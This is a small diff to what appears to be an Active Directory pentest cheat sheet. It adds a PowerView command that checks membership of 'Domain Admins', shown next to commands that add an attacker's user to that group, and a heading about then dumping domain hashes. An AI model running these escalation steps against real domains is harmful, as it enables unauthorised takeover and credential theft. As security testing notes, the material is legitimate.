@@ -198,6 +198,10 @@ attackers can escalate privileges by adding themselves to privileged groups like
     Import-Module .PowerView.ps1
     Add-DomainGroupMember -Identity "Domain Admins" -Members "our-user" -Verbose
    ```
+   - To verify:
+     ```powershell
+     Get-DomainGroupMember -Identity 'Domain Admins'
+     ```
 
 #### If we ended up in a *Domain Admin* Group just dump the domain hashes
 ```bash
